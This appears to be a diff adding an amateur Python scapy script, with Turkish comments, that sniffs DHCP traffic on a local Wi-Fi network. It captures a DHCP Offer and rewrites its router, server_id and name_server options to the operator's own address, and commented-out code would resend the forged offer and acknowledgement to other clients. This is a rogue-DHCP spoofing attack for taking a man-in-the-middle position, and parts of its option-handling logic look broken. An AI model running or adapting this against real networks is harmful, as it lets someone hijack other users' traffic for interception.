@@ -1,0 +1,95 @@
+import random
+from datetime import datetime,timedelta 
+import scapy.all as scapy
+from scapy.layers import dhcp,l2
+import ipcalc
+
+scapy.conf.checkIPaddr = False
+class Test:
+    def __init__(self): 
+        self.network = "192.168.1.0/24"
+        self.interface = "Wi-Fi"
+        self.router = "192.168.1.1"
+        self.stolen_offer_packet = None
+        self.stolen_ack_packet = None
+
+
+
+    def _sniff_dhcp(self,packet):
+        if "DHCP" in packet:
+            print(packet)
+            
+        if (packet.haslayer(dhcp.DHCP)):
+            if "DHCP Offer" in str(packet):
+                dhcp.dhcp_request(req_type="request",requested_addr=packet[dhcp.BOOTP].yiaddr,timeout=0)
+                my_ip = packet[dhcp.BOOTP].yiaddr
+                my_mac = packet[dhcp.BOOTP].chaddr
+                
+                print(my_ip)
+                print(my_mac.decode())
+
+                if self.stolen_offer_packet == None:
+                    self.stolen_offer_packet = packet
+                    self.stolen_offer_packet[dhcp.IP].src = my_ip
+                    self.stolen_offer_packet[dhcp.Ether].src = my_mac
+
+                    #Options
+                    for i in range(0,len(packet[dhcp.DHCP].options)):
+                         if type(packet[dhcp.DHCP].options[i][0]) == tuple:
+                            if packet[dhcp.DHCP].options[i][0] == 'router':
+                                self.stolen_offer_packet[dhcp.DHCP].options[i] = ('router',my_ip)  #Benim IP'm ile router IP'ini değiştir
+                                self.stolen_offer_packet[dhcp.DHCP].options[i] = ('server_id',my_ip)
+                            if packet[dhcp.DHCP].options[i][0] == 'name_server':
+                                self.stolen_offer_packet[dhcp.DHCP].options[i] = ('router',my_ip)
+                                
+                            if packet[dhcp.DHCP].options[i][0] == 'client_id':
+                                self.stolen_offer_packet[dhcp.DHCP].options.pop(i)
+                       
+                       
+                    packet.show()
+
+                                #Send the Request Packet
+                #print(packet[dhcp.BOOTP].yiaddr)
+                #print("Sent the request")
+                #ip_to_give = packet[dhcp.BOOTP].yiaddr
+                #dhcp.dhcp_request(server_id=self.router,req_type='request',requested_addr=ip_to_give,iface=self.interface,hostname="PC-1",xid=packet[dhcp.BOOTP].xid)
+                #scapy.sendp(packet,iface="Ethernet 3")  
+            if "DHCP Ack" in str(packet):
+                print("In offer")
+                # if self.stolen_offer_packet == None:
+                #     for i in range(0,len(packet[dhcp.DHCP].options)):
+                #         if type(packet[dhcp.DHCP].options[i][0]) == tuple:
+                #             if packet[dhcp.DHCP].options[i][0] == 'router':
+                #                 self.stolen_offer_packet = packet
+                                #self.stolen_offer_packet[dhcp.DHCP].options[i] = ('router','1.1.1.3')  #Benim IP'm ile router IP'ini değiştir
+                                
+
+        # if (packet.haslayer(dhcp.DHCP)):
+        #      if "DHCP Request" in str(packet):
+        #          packet.show()
+        # #         self.stolen_ack_packet[dhcp.BOOTP].xid = packet[dhcp.BOOTP].xid
+        # #         self.stolen_ack_packet[dhcp.Ether].dst = packet[dhcp.Ether].src
+        # #         if packet[dhcp.IP == "0.0.0.0"]:    
+        # #             self.stolen_ack_packet[dhcp.IP].dst = packet[dhcp.IP].src
+        # #         self.stolen_ack_packet.show()
+        # #         scapy.sendp(self.stolen_ack_packet,iface="Ethernet 3")
+        # #         print("Sent the ack packet to" + str(packet[dhcp.Ether].src))
+                            
+
+        
+        # if (packet.haslayer(dhcp.DHCP)):
+        #     if "DHCP Discover" in str(packet):
+        #         self.stolen_offer_packet[dhcp.BOOTP].xid = packet[dhcp.BOOTP].xid
+        #         self.stolen_offer_packet[dhcp.Ether].dst = packet[dhcp.Ether].src
+        #         self.stolen_offer_packet[dhcp.IP].dst = packet[dhcp.IP].src
+        #         scapy.sendp(self.stolen_offer_packet,iface="Ethernet 3")
+        #         print("Sent the offer packet to" + str(packet[dhcp.Ether].src))
+                
+                
+    def send_packet(self):                
+        dhcp.dhcp_request(req_type="discover",timeout=0)
+        
+attacks = Test()
+attacks.send_packet()
+print("Sent the packet and captured the offer packet")
+scapy.sniff(iface="Wi-Fi",store=False,prn=attacks._sniff_dhcp)
